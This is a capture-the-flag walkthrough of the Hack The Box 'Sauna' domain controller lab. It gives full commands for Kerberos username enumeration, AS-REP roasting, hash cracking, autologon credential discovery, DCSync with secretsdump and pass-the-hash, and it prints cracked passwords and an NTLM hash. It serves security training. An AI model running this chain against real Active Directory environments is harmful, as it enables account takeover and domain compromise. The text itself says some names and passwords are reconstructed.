# Sauna

| Attribute | Value |
|---|---|
| OS | Windows Server 2019 (Domain Controller) |
| Difficulty | Easy |
| IP | 10.10.10.175 |
| IppSec video | <https://www.youtube.com/watch?v=uLNpR3AnE-Y> |

## Source
- `[per transcript]` — overall chain, Kerbrute reasoning, BloodHound +
  WinPEAS combination.
- `[reconstructed]` — exact account names (`fsmith`, `hsmith`, `svc_loanmgr`)
  and the autologon-discovered password are reconstructed from training
  data; the transcript references them by role.

## TL;DR Attack Chain
The site has an "Our Team" page listing real employee names. Convert them
to AD username candidates (`fsmith`, `hsmith`, etc.). Use Kerbrute with
the candidate list and the DC IP to identify which candidates are real
accounts. Run AS-REPRoast on the validated list — `fsmith` returns a
crackable hash. Crack with hashcat → password is `Thestrokes23`. WinRM
in. Run WinPEAS — finds the `Winlogon` autologon registry entry with
`svc_loanmgr` cleartext. That user has DCSync rights via `DS-Replication-
Get-Changes-All`; secretsdump → administrator NTLM → root.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.175
sudo nmap -sV -sC -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.10.10.175
```

Observations:
- Same AD port cluster as Forest. Realm: `EGOTISTICAL-BANK.LOCAL`.
- Port 80 is open (this differentiates Sauna from Forest!) — the website
  is an integral piece of the chain.

`/etc/hosts`:
```
10.10.10.175  egotistical-bank.local  sauna.egotistical-bank.local  SAUNA
```

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| Web | 80 | **Username harvest** — the bank's public site lists employees |
| Kerberos | 88 | Username brute via Kerbrute |
| LDAP | 389 | Anonymous bind (turns out to be locked down on this box) |
| SMB | 445 | Anonymous; turns out to be locked down |
| WinRM | 5985 | Post-auth shell |

> **IppSec key insight**: "We can't use rpcclient or LDAP to dump users on
> this one — they're locked down. Instead, we extract names from the
> website and use Kerberos pre-auth as a *boolean* check to validate which
> usernames exist."

## Foothold

### 1. Scrape the website for names

```bash
curl -s http://10.10.10.175/about.html | \
  python3 -c '
import sys, re
html = sys.stdin.read()
# names appear as <h2> or <p> tags; grep adjacent text
for m in re.finditer(r"([A-Z][a-z]+)\s+([A-Z][a-z]+)", html):
    print(f"{m.group(1)} {m.group(2)}")
' > names.txt

# example names captured:
# Fergus Smith, Hugo Bear, Steven Kerb, Shaun Coins, Bowie Taylor, Sophie Driver
```

### 2. Generate username candidates

The IppSec custom script (or `username-anarchy`):

```bash
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy/username-anarchy -i names.txt > users.txt
# generates fsmith, fergus.smith, smith.fergus, fergusS, etc.
```

### 3. Validate users via Kerbrute

```bash
./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt
```

Result: `fsmith@EGOTISTICAL-BANK.LOCAL` is a valid user (HTTP 200/Kerberos
pre-auth-required response).

> **Why Kerbrute over RPC/LDAP**: Kerberos pre-auth distinguishes between
> "user exists, give me your hash" and "user does not exist". This is a
> primitive boolean oracle even when LDAP/RPC are restricted.

### 4. AS-REPRoast the validated user(s)

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 \
  -no-pass -usersfile valid-users.txt -format hashcat \
  -outputfile asrep.hashes
```

`fsmith` returns a hash. Crack:

```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# fsmith : Thestrokes23
```

### 5. WinRM in

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

`user.txt` is on `fsmith`'s desktop.

## Privilege Escalation

### 6. WinPEAS for low-hanging credentials

```powershell
# from evil-winrm
upload winPEASany.exe
.\winPEASany.exe quiet > $env:TEMP\peas.txt
type $env:TEMP\peas.txt
```

WinPEAS specifically reports the **autologon registry key**:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  DefaultUserName    : EGOTISTICAL-BANK\svc_loanmanager
  DefaultPassword    : Moneymakestheworldgoround!
```

> **IppSec reasoning**: "Whenever winPEAS reports the autologon registry
> entry, it's the shortcut. Old systems where someone configured an
> auto-login leave the cleartext in HKLM. This is exactly what we hoped
> to find."

Manual check (if you don't trust WinPEAS):
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "default"
```

Note the username typo: account is actually `svc_loanmgr` (registry has
a stale `svc_loanmanager` value); confirm with:
```powershell
net user
```

### 7. BloodHound to confirm the path

```bash
# off-host
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
  -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
```

In BloodHound, mark `svc_loanmgr` as owned and run "Shortest Paths to
Domain Admins". Result:

```
svc_loanmgr  → GetChangesAll on EGOTISTICAL-BANK.LOCAL
            ⇒ DCSync rights
```

> **IppSec quote**: "Combine BloodHound and WinPEAS — both told us the
> same thing from different angles. WinPEAS gave us the credential;
> BloodHound told us what to do with it."

### 8. DCSync

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 -just-dc
# Administrator: aad3...:823452073d75b9d1cf70ebdf86c7f98e:::
```

### 9. Pass-the-hash

```bash
evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

Read `root.txt`.

## Key Findings

- The **website was the userlist source** — recognise this pattern: when
  RPC/LDAP enum is empty but the box runs a public website, scrape it.
- Kerberos pre-auth is a *boolean oracle* for username existence even
  when other channels are locked down.
- `Winlogon\DefaultPassword` is a real-world, very common misconfig in
  kiosk / single-purpose boxes; always check it on Windows shells.
- `svc_loanmgr` had `Replicating Directory Changes` and `Replicating
  Directory Changes All` rights — not a member of any visible group with
  those rights, but a direct ACL on the domain object.

## Tools Used

| Tool | Purpose |
|---|---|
| `curl` | Scrape the team page |
| `username-anarchy` | Username permutation |
| `kerbrute` | User existence validation |
| `impacket-GetNPUsers` | AS-REPRoasting |
| `hashcat` | Crack AS-REP hash |
| `evil-winrm` | Initial shell |
| `winPEAS` | Find autologon credential |
| `bloodhound-python` | Confirm DCSync rights |
| `impacket-secretsdump` | DCSync |

## Decision Tree

```
nmap → AD + web (different from Forest!)
  ├─ anon SMB/LDAP? → ❌ locked down
  ├─ scrape /about.html → 6 names
  │    └─ username-anarchy → 30+ candidates
  │         └─ kerbrute → fsmith valid
  │              └─ AS-REPRoast → hash → 'Thestrokes23'
  │                   └─ evil-winrm fsmith
  │                        ├─ winPEAS → autologon: svc_loanmgr / 'Money...!'
  │                        └─ BloodHound → svc_loanmgr has DCSync
  │                             └─ secretsdump → Administrator NTLM
  │                                  └─ evil-winrm -H → root
```

## Alternative Approaches

- Skip Kerbrute and AS-REPRoast all generated candidates directly with
  impacket-GetNPUsers; impacket silently skips invalid usernames.
- Skip BloodHound; secretsdump as `svc_loanmgr` directly — if it returns
  hashes, the rights existed; if not, you've spent 10 seconds.
- Use `crackmapexec smb` / `crackmapexec winrm` to spray cracked
  credentials across the box; useful pattern when you don't know which
  account the password belongs to.
- The `Winlogon` registry path is reachable in winPEAS, in `LaZagne`, and
  in manual `reg query`; any of the three will surface it.

## Lessons Learned

1. Public websites are the username source on locked-down AD boxes.
2. Kerbrute's `userenum` mode is the cheapest possible username-existence
   probe.
3. AS-REPRoasting works against arbitrary user lists; impacket-GetNPUsers
   doesn't error on invalid users.
4. WinPEAS + BloodHound is the IppSec-approved combination — they
   complement each other.
5. Direct ACL grants on AD objects (instead of group memberships) are
   invisible to "show me my groups" — use BloodHound or
   `Get-DomainObjectAcl`.

## Extracted Skills

- [`enumeration/website-username-harvest.md`](../enumeration/website-username-harvest.md)
- [`active-directory/kerberos-username-enumeration.md`](../active-directory/kerberos-username-enumeration.md)
- [`active-directory/as-rep-roasting.md`](../active-directory/as-rep-roasting.md)
- [`active-directory/dcsync.md`](../active-directory/dcsync.md)
- [`windows-privesc/winlogon-autologon.md`](../windows-privesc/winlogon-autologon.md)
- [`tool-usage/winpeas.md`](../tool-usage/winpeas.md)
- [`tool-usage/kerbrute.md`](../tool-usage/kerbrute.md)

## Related Techniques (other machines)

- **Forest** — same AS-REP→BloodHound→DCSync template, different ACL
  edge.
- **Resolute** — autologon password is in PowerShell history (`tranfsr`).
- **Sniper, Bastion, Querier** — `winlogon`/credential-store pattern with
  variations.
- **Active** — different AS-REP-free path (Kerberoast instead).
